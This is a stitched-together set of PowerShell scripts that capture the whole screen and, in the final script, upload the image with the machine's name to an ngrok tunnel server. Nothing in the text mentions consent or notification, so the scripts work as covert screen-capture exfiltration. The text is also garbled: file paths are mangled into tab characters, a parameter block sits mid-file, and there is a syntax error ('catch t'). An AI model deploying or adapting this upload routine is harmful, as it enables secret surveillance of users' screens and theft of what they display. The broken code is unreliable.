$scriptContent = @"
# Screenshot script with detailed logging
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Write-Host "Loading required assemblies..." -ForegroundColor Green

try {
    Write-Host "Getting screen bounds..." -ForegroundColor Yellow
    `$bounds = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds
    Write-Host "Screen size: `$(`$bounds.Width)x`$(`$bounds.Height)" -ForegroundColor Cyan
    
    Write-Host "Creating bitmap..." -ForegroundColor Yellow
    `$bitmap = New-Object System.Drawing.Bitmap `$bounds.Width, `$bounds.Height
    
    Write-Host "Creating graphics object..." -ForegroundColor Yellow
    `$graphics = [System.Drawing.Graphics]::FromImage(`$bitmap)
    
    Write-Host "Capturing screen..." -ForegroundColor Yellow
    `$graphics.CopyFromScreen(`$bounds.Location, [System.Drawing.Point]::Empty, `$bounds.Size)
    
    Write-Host "Saving to C:	emp	arget.png..." -ForegroundColor Yellow
    `$bitmap.Save("C:	emp	arget.png", [System.Drawing.Imaging.ImageFormat]::Png)
    
    Write-Host "Cleaning up..." -ForegroundColor Yellow
    `$graphics.Dispose()
    `$bitmap.Dispose()
    
    Write-Host "Screenshot completed successfully\!" -ForegroundColor Green
    Get-Item "C:	emp	arget.png"
}
catch {
    Write-Host "Error occurred: `$(`$_.Exception.Message)" -ForegroundColor Red
    Write-Host "Stack trace: `$(`$_.ScriptStackTrace)" -ForegroundColor Red
}
"@

Write-Host "Creating screenshot script at C:	emp\screenshot.ps1" -ForegroundColor Green

Set-Content -Path "C:	emp\screenshot.ps1" -Value $scriptContent -Encoding UTF8

# Load required assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Get screen bounds
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
Write-Output "Screen size: $($Screen.Width)x$($Screen.Height)"

# Create bitmap
Write-Output "Creating bitmap..."
$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height

# Create graphics object
Write-Output "Creating graphics object..."
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)

# Capture screen
Write-Output "Capturing screen..."
$graphics.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $Screen.Size, [System.Drawing.CopyPixelOperation]::SourceCopy)

# Ensure temp directory exists  
$tempDir = "$env:TEMP"
Write-Output "Ensuring temp directory exists..."
if (!(Test-Path $tempDir)) {
    New-Item -ItemType Directory -Path $tempDir -Force | Out-Null
}

# Save screenshot
$screenshotPath = Join-Path $tempDir "screenshot.png"
Write-Output "Saving screenshot to: $screenshotPath"

try {
    $bitmap.Save($screenshotPath, [System.Drawing.Imaging.ImageFormat]::Png)
    Write-Output "SUCCESS: Screenshot saved successfully!"
    Write-Output "File size: $(Get-Item $screenshotPath | Select-Object -ExpandProperty Length) bytes"
} catch {
    Write-Output "ERROR: Failed to save screenshot - $($_.Exception.Message)"
} finally {
    $graphics.Dispose()
    $bitmap.Dispose()
}

# Take screenshot and upload to server
param(
    [string]$ServerUrl = "https://7dde9b3f7e6b.ngrok-free.app",
    [string]$ClientId = $env:COMPUTERNAME
)

# Load required assemblies
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

Write-Output "Taking screenshot..."

# Get screen bounds
$Screen = [System.Windows.Forms.SystemInformation]::VirtualScreen
Write-Output "Screen size: $($Screen.Width)x$($Screen.Height)"

# Create bitmap and capture screen
$bitmap = New-Object System.Drawing.Bitmap $Screen.Width, $Screen.Height
$graphics = [System.Drawing.Graphics]::FromImage($bitmap)
$graphics.CopyFromScreen($Screen.X, $Screen.Y, 0, 0, $Screen.Size, [System.Drawing.CopyPixelOperation]::SourceCopy)

# Save to temporary file
$tempFile = [System.IO.Path]::GetTempFileName() + ".png"
Write-Output "Saving to: $tempFile"

try {
    $bitmap.Save($tempFile, [System.Drawing.Imaging.ImageFormat]::Png)
    $graphics.Dispose()
    $bitmap.Dispose()
    
    $fileInfo = Get-Item $tempFile
    Write-Output "Screenshot saved: $($fileInfo.Length) bytes"
    
    # Upload to server
    Write-Output "Uploading to server..."
    
    # Create form data
    $boundary = [System.Guid]::NewGuid().ToString()
    $LF = "`r`n"
    
    # Read file content
    $fileBytes = [System.IO.File]::ReadAllBytes($tempFile)
    $fileEnc = [System.Text.Encoding]::GetEncoding('iso-8859-1').GetString($fileBytes)
    
    # Build form data
    $bodyLines = @(
        "--$boundary",
        'Content-Disposition: form-data; name="file"; filename="screenshot.png"',
        "Content-Type: image/png",
        "",
        $fileEnc,
        "--$boundary",
        'Content-Disposition: form-data; name="client_id"',
        "",
        $ClientId,
        "--$boundary--"
    )
    
    $body = $bodyLines -join $LF
    
    # Upload
    $response = Invoke-RestMethod -Uri "$ServerUrl/files/upload" `
        -Method POST `
        -Body $body `
        -ContentType "multipart/form-data; boundary=$boundary"
    
    Write-Output "Upload successful!"
    Write-Output "File ID: $($response.file_id)"
    Write-Output "Download URL: $ServerUrl/files/download/$($response.file_id)"
    
} catch t
    Write-Output "Error: $($_.Exception.Message)"
} finally {
    # Cleanup
    if (Test-Path $tempFile) {
        Remove-Item $tempFile -Force
    }
}
